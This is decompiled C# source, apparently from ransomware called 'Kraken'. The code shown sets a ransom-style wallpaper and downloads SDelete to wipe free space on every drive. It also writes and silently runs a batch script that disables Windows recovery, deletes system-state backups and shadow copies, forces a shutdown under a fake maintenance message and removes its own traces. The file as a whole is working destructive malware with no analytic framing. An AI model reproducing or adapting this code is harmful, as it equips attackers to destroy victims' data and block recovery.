using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;

internal static class Class19
{
	[Serializable]
	[CompilerGenerated]
	private sealed class Class20
	{
		public static readonly Class20 _003C_003E9 = new Class20();

		public static ThreadStart _003C_003E9__0_0;

		internal void method_0()
		{
			smethod_0();
		}
	}

	[STAThread]
	private static void Main()
	{
		new Mutex(initiallyOwned: true, $"Microsoft-Kraken-{Environment.MachineName}", out var createdNew);
		if (!createdNew)
		{
			Environment.Exit(0);
		}
		bool flag = false;
		int[] array = new int[3] { 32, 48, 64 };
		foreach (int num in array)
		{
			if (new FileInfo(Application.get_ExecutablePath()).Name.Length == num - ".exe".Length)
			{
				flag = true;
			}
		}
		if (GClass6.smethod_0() && !flag)
		{
			Class12.smethod_6("Begin");
			Thread thread = new Thread((ThreadStart)delegate
			{
				smethod_0();
			});
			thread.Start();
			thread.Join();
			Class12.smethod_6("End:" + GClass8.long_0);
			smethod_1();
		}
		Class12.smethod_17(0);
	}

	private static void smethod_0()
	{
		GClass9.smethod_0(Class7.Class8.Byte_0, Class7.Class8.Byte_1);
		Class7.Class8.Byte_0 = null;
		Class7.Class8.Byte_1 = null;
	}

	private static void smethod_1()
	{
		try
		{
			GClass6.GClass7.String_15 = Regex.Replace(GClass6.GClass7.String_15, "%1", Environment.UserName);
			GClass6.GClass7.String_15 = Regex.Replace(GClass6.GClass7.String_15, "%2", "2.0");
			GClass6.GClass7.String_15 = Regex.Replace(GClass6.GClass7.String_15, "%3", GClass6.GClass7.String_12 + "-" + Class7.Class8.String_1 + "." + GClass6.GClass7.String_13);
			GClass6.GClass7.String_15 = Regex.Replace(GClass6.GClass7.String_15, "%4", "." + Class7.Class8.String_1);
			Image obj = Class12.Class13.smethod_2(GClass6.GClass7.String_15, Color.Black);
			string text = "";
			text = Path.Combine(Path.GetTempPath(), Path.GetTempFileName() + ".bmp");
			obj.Save(text);
			if (File.Exists(text))
			{
				Class12.Class14.smethod_0(text, Class12.Class14.Enum1.Stretched);
			}
		}
		catch (Exception)
		{
		}
		try
		{
			string text2 = $"{Environment.SystemDirectory.Substring(0, 1)}:\\ProgramData\\";
			if (!Directory.Exists(text2))
			{
				Directory.CreateDirectory(text2);
			}
			byte[] array;
			using (WebClient webClient = new WebClient())
			{
				array = webClient.DownloadData("https://download.sysinternals.com/files/SDelete.zip");
				if (array == null)
				{
					return;
				}
			}
			string text3 = Path.Combine(text2, "Microsoft.zip");
			File.WriteAllBytes(text3, array);
			Class21 @class = new Class21(text3);
			@class.method_0(text2);
			@class.Dispose();
			File.Delete(text3);
			if (!File.Exists(Path.Combine(text2, "sdelete.exe")) && !File.Exists(Path.Combine(text2, "sdelete64.exe")))
			{
				return;
			}
			if (File.Exists(Path.Combine(text2, "Eula.txt")))
			{
				File.Delete(Path.Combine(text2, "Eula.txt"));
			}
			if (string.IsNullOrEmpty(Environment.GetEnvironmentVariable("PROCESSOR_ARCHITEW6432")))
			{
				if (File.Exists(Path.Combine(text2, "sdelete64.exe")))
				{
					File.Delete(Path.Combine(text2, "sdelete64.exe"));
				}
			}
			else
			{
				if (File.Exists(Path.Combine(text2, "sdelete.exe")))
				{
					File.Delete(Path.Combine(text2, "sdelete.exe"));
				}
				File.Move(Path.Combine(text2, "sdelete64.exe"), Path.Combine(text2, "sdelete.exe"));
			}
			string text4 = "release.bat";
			string text5 = $":: [Version {GClass6.GClass7.Double_0}]" + Environment.NewLine + Environment.NewLine + "REM [Echo OFF]" + Environment.NewLine + "@echo off" + Environment.NewLine + Environment.NewLine + "REM [Microsoft Sysinternals Eula Accepted]" + Environment.NewLine + "REG ADD \"HKEY_CURRENT_USER\\Software\\Sysinternals\\SDelete\"" + Environment.NewLine + "REG ADD \"HKEY_CURRENT_USER\\Software\\Sysinternals\\SDelete\" /v EulaAccepted /t REG_DWORD /d 1 /f" + Environment.NewLine + Environment.NewLine + "REM [Wipe Drives Free Space]" + Environment.NewLine;
			string[] logicalDrives = Environment.GetLogicalDrives();
			foreach (string text6 in logicalDrives)
			{
				if ((new DriveInfo(text6).IsReady && new DriveInfo(text6).DriveType != DriveType.CDRom) || new DriveInfo(text6).DriveType != 0)
				{
					text5 = ((text6.Substring(0, 1) == Environment.SystemDirectory.Substring(0, 1)) ? (text5 + $"cmd.exe /c {text2}sdelete.exe -c -z {text6.Substring(0, 1)}:{Environment.NewLine}") : (text5 + $"cmd.exe /c {text2}sdelete.exe -z {text6.Substring(0, 1)}:{Environment.NewLine}"));
				}
			}
			text5 = text5 + Environment.NewLine + "REM [Start SYSTEM Shutdown Timer]" + Environment.NewLine + string.Format("shutdown /S /F /T {0} /C \"{1}\"", 300, "Unexpected shutdown due to maintenance break.") + Environment.NewLine + Environment.NewLine + "REM [Disable Safe Boot]" + Environment.NewLine + "bcdedit /set {default} recoveryenabled No" + Environment.NewLine + "bcdedit /set {default} bootstatuspolicy ignoreallfailures" + Environment.NewLine + Environment.NewLine + "REM [Delete Backups]" + Environment.NewLine + "wbadmin DELETE SYSTEMSTATEBACKUP -keepVersions:0" + Environment.NewLine + "wmic SHADOWCOPY DELETE" + Environment.NewLine + "vssadmin delete shadows /All" + Environment.NewLine + Environment.NewLine + "REM [Delete Temp Files]" + Environment.NewLine + string.Format("del {0}", Path.Combine(text2, "sdelete.exe")) + Environment.NewLine + $"del {Path.Combine(text2, text4)}";
			File.WriteAllText(Path.Combine(text2, text4), text5);
			Process obj2 = new Process
			{
				StartInfo = 
				{
					CreateNoWindow = true,
					WindowStyle = ProcessWindowStyle.Hidden,
					FileName = "cmd.exe",
					Arguments = $"/C cd {text2} && {text4}"
				}
			};
			new ProcessStartInfo(text2 + text4);
			obj2.Start();
		}
		catch (Exception)
		{
		}
	}
}
